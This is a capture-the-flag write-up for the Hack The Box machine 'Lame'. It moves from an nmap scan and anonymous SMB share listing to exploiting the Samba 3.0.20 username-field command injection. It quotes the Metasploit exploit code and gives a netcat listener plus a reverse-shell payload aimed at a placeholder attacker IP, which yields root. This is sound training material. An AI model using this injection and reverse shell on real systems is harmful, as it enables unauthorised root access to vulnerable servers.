---
tags:
  - HTB
  - Linux
  - Easy
  - RCE
---
https://app.hackthebox.com/machines/Lame/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.10.3 lame.htb
```
# Scanning
```console
$ nmap -p21,22,139,445,3632 -sV -sC lame.htb

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.71
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
FTP has an old version, but could not get anywhere from there.

SMB is vulnerable to RCE by sending a payload inside the **username** field when logging in. Take a look at the [exploit](https://www.exploit-db.com/exploits/16320) with `searchsploit -x unix/remote/16320.rb`:
```ruby
def exploit

	connect

	# lol?
	username = "/=`nohup " + payload.encoded + "`"
	begin
		simple.client.negotiate(false)
		simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
	rescue ::Timeout::Error, XCEPT::LoginError
		# nothing, it either worked or it didn't ;)
	end

	handler
end
```
# Enumeration
Try to connect to SMB:
```console
$ smbclient -N -L //lame.htb

Protocol negotiation to server lame.htb (for a protocol between SMB2_02 and SMB3) failed: NT_STATUS_CONNECTION_DISCONNECTED
```
Solve the [issue](https://forums.mageia.org/en/viewtopic.php?f=25&t=14398) and list shares:
```console
$ smbclient --option 'client min protocol = NT1' -N -L //lame.htb

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
```
# Exploitation
Wait for connections:
```bash
nc -lvnp <PORT>
```
Establish reverse shell connection:
```console
$ smbclient --option 'client min protocol = NT1' -N //lame.htb/tmp

smb: \> logon "/=`nohup nc -e /bin/bash <ATTACKER-IP> <PORT>`" ""
```
# Post-Exploitation
We are **user root**:
```console
$ whoami

root
```
Read the **user flag**:
```bash
cat /home/makis/user.txt
```
Read the **root flag**:
```bash
cat /root/root.txt
```